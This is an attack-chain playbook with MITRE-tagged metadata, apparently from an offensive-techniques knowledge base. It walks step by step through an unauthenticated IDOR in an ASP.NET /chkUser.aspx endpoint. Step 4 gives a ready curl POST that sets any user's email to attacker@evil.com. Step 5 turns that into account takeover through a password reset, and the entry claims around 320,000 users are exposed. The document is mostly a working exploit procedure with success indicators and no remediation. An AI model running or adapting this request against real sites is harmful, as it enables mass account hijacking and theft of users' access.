---
tags:
  - idor
  - account-takeover
  - email-hijacking
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Register-Test-Account-to-Obtain-UID]]'
  - '[[procedures/Verify-Login-with-Registered-Account]]'
  - '[[procedures/Logout-to-Ensure-Unauthenticated-State]]'
  - '[[procedures/Exploit-IDOR-to-Change-User-Email]]'
  - '[[procedures/Verify-Email-Change-and-Account-Takeover]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:33:11.932Z'
description: >-
  Exploits an unauthenticated IDOR in the /chkUser.aspx endpoint to change any
  user's email, enabling mass account takeovers through password resets without
  user interaction.
skill_level: intermediate
impact_level: high
id: 860578d6-de30-4b00-8f46-7779fc6a2ce0
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Unauthenticated IDOR for Mass Account Takeover via Email Hijacking

Multi-stage attack chain demonstrating exploitation of an unauthenticated Insecure Direct Object Reference (IDOR) vulnerability in the /chkUser.aspx endpoint of an ASP.NET web application, allowing attackers to hijack user accounts by changing email addresses without authentication. This leads to mass account takeovers for approximately 320,000 users via password resets, as attackers can redirect emails to controlled domains.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Register Test Account] --> B[Verify and Logout]
    B --> C[Exploit IDOR Email Change]
    C --> D[Verify Takeover]
    D --> E[Mass Takeover Potential]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#9b59b6
```

## Prerequisites & Requirements

### Required Tools

- Browser with developer tools (e.g., Chrome DevTools for monitoring requests)
- Command-line tool like curl for POST requests

### Target Environment

- Web platform (ASP.NET application)
- Target URL: https://target.edu (public-facing registration endpoint)
- No specific ports beyond standard HTTPS (443)

### Initial Access Requirements

- No prior credentials needed; unauthenticated access
- Network access to the target virtual host
- Ability to register test accounts

## Detailed Attack Procedures

### Step 1: Register Test Account to Obtain UID
procedure: [[procedures/Register-Test-Account-to-Obtain-UID]]

**Objective**: Create a test account to discover the numeric UID format used in the application.

**Instructions**: Use the registration form on the target site. Ensure passwords are short (6-7 characters) to avoid any stripping issues. Monitor the network tab in browser dev tools for the final 'Register' POST request to https://target.edu/chkUser.aspx and extract the numeric UID from the response.

**Expected Output**: Successful registration confirmation with UID visible in response (e.g., JSON or HTML containing "UID: 12345").

**Success Indicators**:
- Account registered successfully
- UID extracted from response

### Step 2: Verify Login with Registered Account
procedure: [[procedures/Verify-Login-with-Registered-Account]]

**Objective**: Confirm the registered account functions normally to establish baseline.

**Instructions**: Navigate to the login page and enter the test credentials (email and password) to authenticate.

**Expected Output**: Successful login redirect to dashboard or user profile.

**Success Indicators**:
- Login succeeds without errors
- Session established

### Step 3: Logout to Ensure Unauthenticated State
procedure: [[procedures/Logout-to-Ensure-Unauthenticated-State]]

**Objective**: Clear any active session to test unauthenticated exploitation.

**Instructions**: Click the logout button or send a logout request to terminate the session.

**Expected Output**: Redirect to login page; no active session cookies.

**Success Indicators**:
- Session cleared
- Cannot access protected areas without re-login

### Step 4: Exploit IDOR to Change User Email
procedure: [[procedures/Exploit-IDOR-to-Change-User-Email]]

**Objective**: Use the obtained UID format to target another user's UID and change their email to an attacker-controlled address.

**Instructions**: Prepare a POST request to /chkUser.aspx with the target UID (replace [YOUR_ID_HERE] with a numeric ID, e.g., from another test account or enumerated). Use the following command with curl, adjusting the host and parameters:

Execute [[commands/unauthenticated-email-change-idor]]:

```bash
curl -X POST https://target.edu/chkUser.aspx \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dummy=&sendingForm=6&UID=[YOUR_ID_HERE]&last=test&midd=&frst=test&serv=test&mail=attacker@evil.com&tLang=&course=1&school=Other+non-Government&other&freq=Rarely&test=1&reading_score=&listening_score=aaa&speaking_score=aaa&test_taken=Other&other_test=test&when=more+than+a+year+ago"
```

**Expected Output**: Server response indicating successful update (e.g., no error, status 200).

**Success Indicators**:
- No authentication error
- Email updated for the target UID

### Step 5: Verify Email Change and Account Takeover
procedure: [[procedures/Verify-Email-Change-and-Account-Takeover]]

**Objective**: Confirm the email hijack and demonstrate takeover via password reset.

**Instructions**: Attempt login with the new (dummy/attacker) email and the original password. Then, initiate a password reset using the new email to gain full control.

**Expected Output**: Login succeeds with new email; original email fails; password reset email sent to attacker-controlled address.

**Success Indicators**:
- Original email cannot login
- New email grants access
- Password reset possible without original owner interaction

## Attack Chain Summary

### Key Achievements

1. Discovered UID enumeration via registration
2. Exploited unauthenticated IDOR to hijack emails
3. Enabled mass takeovers for 320,000 users via resets

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Valid Accounts]] Valid Accounts

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery

---

*Last updated: 2023-10-01T00:00:00Z*
